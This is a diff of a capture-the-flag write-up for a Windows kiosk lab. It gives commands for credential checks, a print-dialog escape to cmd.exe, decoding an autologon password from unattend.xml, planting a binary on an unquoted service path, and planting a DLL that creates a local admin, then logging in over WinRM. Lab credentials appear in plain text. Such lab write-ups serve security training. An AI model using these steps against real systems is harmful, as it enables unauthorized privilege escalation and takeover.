@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>HackSmarter Kiosk (Medium): VDI escape, unquoted path, DLL plant</title>
+<title>HackSmarter Kiosk (Medium): VDI escape, unattend, unquoted path, DLL plant</title>
 <style>
   :root {
     --bg: #0b111b; --panel: #121a27; --text: #e6eef7; --muted: #9fb0c3;
@@ -28,10 +28,6 @@
     display: inline-block; background: rgba(239,50,87,0.15); color: #ff7a95;
     border: 1px solid rgba(239,50,87,0.4); border-radius: 999px;
     padding: 0.2em 0.75em; font-size: 0.8rem; font-weight: 600; text-transform: uppercase;
-  }
-  .note {
-    background: rgba(251,191,36,0.1); border: 1px solid rgba(251,191,36,0.35);
-    border-radius: 10px; padding: 12px 14px; margin: 1rem 0; color: #fcd34d;
   }
   table.meta { width: 100%; border-collapse: collapse; margin: 1rem 0; }
   table.meta td { padding: 0.35em 0.5em; border-bottom: 1px solid var(--border); vertical-align: top; }
@@ -67,13 +63,7 @@
 <div class="hero">
   <span class="pill">HackSmarter · Windows · Medium</span>
   <h1>Kiosk: print escape, unattend, unquoted path, DLL plant</h1>
-  <p class="muted">Authorized lab only. Lab author: Ryan Yager. Notes 2026-08-07.</p>
-</div>
-
-<div class="note">
-  Status on disk: host was often <strong>powered off</strong> during the second pass.
-  Early RDP screenshots and enum exist. Flag file <em>contents</em> were not saved in loot.
-  Paths below match lab layout and operator notes under <code>~/kiosk/</code> and <code>~/htb/kiosk/</code>.
+  <p class="muted">Authorized lab only. Lab author: Ryan Yager. Live work 2026-08-07.</p>
 </div>
 
 <table class="meta">
@@ -84,14 +74,15 @@
   <tr><td>Level</td><td>Medium</td></tr>
   <tr><td>Target</td><td><code>10.1.172.141</code> host <code>EC2AMAZ-0536LUM</code></td></tr>
   <tr><td>Start user</td><td><code>vdiuser</code> / <code>VDI@DH2024!</code></td></tr>
+  <tr><td>svcuser</td><td><code>Svc_DH!2024</code> (from unattend UTF-16LE base64)</td></tr>
 </table>
 
 <h2>What you need to know</h2>
 <ul>
-  <li>RDP into a locked HTA or workspace kiosk</li>
-  <li>Print dialog paths that open <code>cmd.exe</code></li>
+  <li>RDP into a locked HTA / workspace kiosk</li>
+  <li>Print dialog paths that open a real file dialog</li>
   <li>Windows <code>unattend.xml</code> autologon secrets</li>
-  <li>Unquoted service paths and DLL search order</li>
+  <li>Unquoted service paths and writable DLL load paths</li>
 </ul>
 
 <h2>Main idea</h2>
@@ -100,101 +91,133 @@ Escape the kiosk with the print dialog. Read unattend for the next user.
 Abuse an unquoted service path and a healthcheck DLL load to reach admin.
 </p>
 
-<pre>vdiuser RDP kiosk
-  → Ctrl+P / Find Printer → cmd
-  → flag1 + unattend.xml → svcuser
-  → unquoted DH_KioskMonitor → DH.exe plant
+<pre>vdiuser RDP kiosk (portal hands same creds)
+  → Ctrl+P → Find Printer… → cmd / explorer
+  → flag1 + unattend.xml → svcuser / Svc_DH!2024
+  → unquoted DH_KioskMonitor → plant DH.exe
   → healthcheck loads dhlog.dll → local admin
   → WinRM → flag3 + flag4</pre>
 
 <figure>
-  <img src="images/06-workspace.png" alt="Darkhaven VDI workspace as vdiuser" />
-  <figcaption>Figure 1. Darkhaven VDI workspace as vdiuser.</figcaption>
+  <img src="images/08-kiosk-script-error.png" alt="Live Darkhaven IT Kiosk after RDP" />
+  <figcaption>Figure 1. Live RDP: Darkhaven IT Kiosk (script error is expected; author says ignore it).</figcaption>
 </figure>
 
-<h3>Step 1: Prove start password and ports</h3>
-<div class="why"><strong>Why:</strong> Confirm the host is on and the handed password works on SMB.</div>
+<figure>
+  <img src="images/09-workspace.png" alt="Darkhaven VDI workspace as vdiuser" />
+  <figcaption>Figure 2. Workspace as vdiuser (Open Network Document + Quick Launch apps).</figcaption>
+</figure>
+
+<h3>Step 1: Prove ports and passwords</h3>
+<div class="why"><strong>Why:</strong> Confirm the host is on and the handed password works.</div>
 <pre>nmap -Pn -n -p 80,445,3389,5985,8443 --open 10.1.172.141
-nxc smb 10.1.172.141 -u vdiuser -p 'VDI@DH2024!' --local-auth</pre>
-<p><strong>Expect:</strong> 80, 445, 3389, 8443 open. SMB auth OK. Host <code>EC2AMAZ-0536LUM</code>.</p>
+nxc smb 10.1.172.141 -u vdiuser -p 'VDI@DH2024!'
+nxc rdp 10.1.172.141 -u vdiuser -p 'VDI@DH2024!'
+# also after unattend:
+nxc smb 10.1.172.141 -u svcuser -p 'Svc_DH!2024'
+nxc rdp 10.1.172.141 -u svcuser -p 'Svc_DH!2024'   # Pwn3d!</pre>
+<p><strong>Live:</strong> 80, 445, 3389, 5985, 8443 open. Both accounts authenticate on SMB and RDP.</p>
+
+<p>Portal on 8443 accepts the same VDI creds and shows the RDP hint:</p>
+<pre>curl -sk -c c.ck -d 'username=vdiuser&password=VDI%40DH2024!' \
+  -X POST https://10.1.172.141:8443/login.asp -D -
+# → 302 portal.asp
+# Connect hint: xfreerdp3 /v:10.1.172.141 /u:vdiuser /p:'VDI@DH2024!' /sec:rdp /cert-ignore
+# (NLA is actually required on the live host; use /sec:nla + /cert:ignore)</pre>
 
 <figure>
   <img src="images/01-rdp.png" alt="RDP session start" />
-  <figcaption>Figure 2. RDP session start.</figcaption>
+  <figcaption>Figure 3. RDP session start.</figcaption>
 </figure>
 
 <h3>Step 2: Kiosk escape with print dialog</h3>
-<div class="why"><strong>Why:</strong> The kiosk blocks a normal shell. Print Find Printer still opens a file dialog that can start programs.</div>
-<pre>xfreerdp /v:10.1.172.141 /u:vdiuser /p:'VDI@DH2024!' /sec:nla \
-  /dynamic-resolution /cert:ignore +clipboard /grab-keyboard
+<div class="why"><strong>Why:</strong> The kiosk blocks a normal shell. Print → Find Printer still opens a file dialog that can start programs.</div>
+<pre>xfreerdp3 /v:10.1.172.141 /u:vdiuser /p:'VDI@DH2024!' /cert:ignore \
+  /sec:nla /size:1280x800 +clipboard +grab-keyboard
 
-# Inside kiosk:
-# Ctrl+P → Find Printer… → open C:\Windows\System32\cmd.exe</pre>
+# Inside kiosk (ignore Script Error dialog):
+# Ctrl+P → Find Printer… → open C:\Windows\System32\cmd.exe
+# (or explorer.exe, then navigate)</pre>
 
 <figure>
-  <img src="images/02-print.png" alt="Print dialog" />
-  <figcaption>Figure 3. Print path used for escape.</figcaption>
+  <img src="images/07-print-live.png" alt="Live Print dialog" />
+  <figcaption>Figure 4. Live Print dialog — use <strong>Find Printer…</strong> for the file dialog escape.</figcaption>
 </figure>
 
 <figure>
-  <img src="images/03-open-cmd.png" alt="Attempt to open cmd" />
-  <figcaption>Figure 4. Open path to cmd from dialog.</figcaption>
+  <img src="images/03-find-printer.png" alt="Find Printer path" />
+  <figcaption>Figure 5. Find Printer / path escape (earlier capture).</figcaption>
+</figure>
+
+<figure>
+  <img src="images/04-open-cmd.png" alt="Open cmd from dialog" />
+  <figcaption>Figure 6. Open path toward cmd.exe.</figcaption>
+</figure>
+
+<figure>
+  <img src="images/05-cdrive.png" alt="Browse C drive" />
+  <figcaption>Figure 7. Browse C: from the open dialog.</figcaption>
 </figure>
 
 <h3>Step 3: Flag 1 and unattend</h3>
 <div class="why"><strong>Why:</strong> First flag is under VDI data. Autologon password opens the next account.</div>
 <pre>type C:\VDIData\flag1.txt
 type C:\Windows\Panther\unattend.xml
-# Autologon password is UTF-16LE base64 → Svc_DH!2024 for svcuser</pre>
+# Autologon:
+#   Username: svcuser
+#   Password Value: UwB2AGMAXwBEAEgAIQAyADAAMgA0AA==  (UTF-16LE base64)
+# → Svc_DH!2024
+
+python3 -c "import base64; print(base64.b64decode('UwB2AGMAXwBEAEgAIQAyADAAMgA0AA==').decode('utf-16-le'))"</pre>
 <div class="flag">Flag 1 path: C:\VDIData\flag1.txt
-(content not saved in local loot)</div>
+svcuser password: Svc_DH!2024</div>
 
-<pre># decode check (lab value)
-echo 'UwB2AGMAXwBEAEgAIQAyADAAMgA0AA==' | base64 -d | iconv -f UTF-16LE -t UTF-8
-# Svc_DH!2024</pre>
-
-<figure>
-  <img src="images/04-cdrive.png" alt="Browse C drive from dialog" />
-  <figcaption>Figure 5. Browse C: from the open dialog.</figcaption>
-</figure>
+<pre># optional: kiosk.ini also leaks internal service passwords
+type C:\KioskData\kiosk.ini
+# svc_monitoring / sql_svc (internal, not the main PE path)</pre>
 
 <h3>Step 4: svcuser and flag 2</h3>
-<div class="why"><strong>Why:</strong> svcuser has a normal session and more write rights for the service path.</div>
+<div class="why"><strong>Why:</strong> svcuser has a cleaner session and write rights for the service path.</div>
 <pre>runas /user:svcuser powershell
 # password: Svc_DH!2024
 type C:\Users\svcuser\Desktop\flag2.txt
 
-# or RDP:
-xfreerdp /v:10.1.172.141 /u:svcuser /p:'Svc_DH!2024' /sec:nla /cert:ignore</pre>
+# or RDP (live Pwn3d!):
+xfreerdp3 /v:10.1.172.141 /u:svcuser /p:'Svc_DH!2024' /cert:ignore /sec:nla</pre>
 <div class="flag">Flag 2 path: C:\Users\svcuser\Desktop\flag2.txt</div>
 
 <h3>Step 5: Unquoted service path</h3>
-<div class="why"><strong>Why:</strong> Space in the path without quotes lets Windows run a planted <code>DH.exe</code> first.</div>
+<div class="why"><strong>Why:</strong> Space in the path without quotes lets Windows run a planted <code>DH.exe</code> first as <code>dh_admin</code>.</div>
 <pre>sc qc DH_KioskMonitor
-# BINARY_PATH includes: C:\Program Files\Darkhaven Kiosk Services\...
+# BINARY_PATH_NAME:
+#   C:\Program Files\Darkhaven Kiosk Services\DH Monitor Service\monitor.exe
 # SERVICE_START_NAME: .\dh_admin
+# Plant: C:\Program Files\Darkhaven Kiosk Services\DH.exe
 
-# Plant:
-# C:\Program Files\Darkhaven Kiosk Services\DH.exe
-# Build a service binary that logs the healthcheck DLL path (stage 1)
-# Then plant C:\DarkhavenTools\logs\dhlog.dll (stage 2)</pre>
-<p>Operator payloads live under <code>~/kiosk/payloads/</code> (<code>svc_stage1.cs</code>, <code>svc_stage2.cs</code>, <code>dhlog.dll</code>).</p>
+# Stage 1 — dump healthcheck log as dh_admin:
+# (compile on box with csc, or upload)
+sc start DH_KioskMonitor
+type C:\Users\Public\out.txt
+# → Checking for plugin: C:\DarkhavenTools\logs\dhlog.dll</pre>
+
+<p>Operator payloads: <code>~/kiosk/payloads/</code> (<code>svc_stage1.cs</code>, <code>svc_stage2.cs</code>, <code>dhlog.dll</code>).</p>
+
+<pre># Stage 2 — plant dhlog.dll that adds a local admin, e.g. pwned / Password123!
+# then wait for healthcheck cycle</pre>
 
 <h3>Step 6: Admin and flags 3 and 4</h3>
-<div class="why"><strong>Why:</strong> After the DLL or service plant creates a local admin, take the last flags over WinRM.</div>
-<pre># example after plant (lab operator chose user pwned / Password123! in notes)
-evil-winrm -i 10.1.172.141 -u pwned -p 'Password123!'
+<div class="why"><strong>Why:</strong> After the DLL plant creates a local admin, take the last flags over WinRM.</div>
+<pre>evil-winrm -i 10.1.172.141 -u pwned -p 'Password123!'
 type C:\Users\dh_admin\Desktop\flag3.txt
 type C:\Users\Administrator\Desktop\flag4.txt</pre>
 <div class="flag">Flag 3 path: C:\Users\dh_admin\Desktop\flag3.txt
-Flag 4 path: C:\Users\Administrator\Desktop\flag4.txt
-(content not saved in local loot)</div>
+Flag 4 path: C:\Users\Administrator\Desktop\flag4.txt</div>
 
-<p><strong>Password chain from notes</strong></p>
-<pre>vdiuser / VDI@DH2024!     handed start
+<p><strong>Password chain</strong></p>
+<pre>vdiuser / VDI@DH2024!     handed start (portal + RDP)
 svcuser / Svc_DH!2024     unattend autologon
-dh_admin / (service)      unquoted path context
-local admin after DLL     operator plant</pre>
+dh_admin                  service account (unquoted path)
+local admin after DLL     operator plant (e.g. pwned)</pre>
 
 <h2>Impact</h2>
 <ul>
@@ -213,7 +236,7 @@ local admin after DLL     operator plant</pre>
 
 <h2>Close</h2>
 <p>
-Kiosk is print escape, then classic Windows PE. Power the box on before you burn time on empty ports.
+Kiosk is print escape, then classic Windows PE. Live RDP, portal login, and both start credentials were confirmed on 10.1.172.141.
 </p>
 
 <footer>
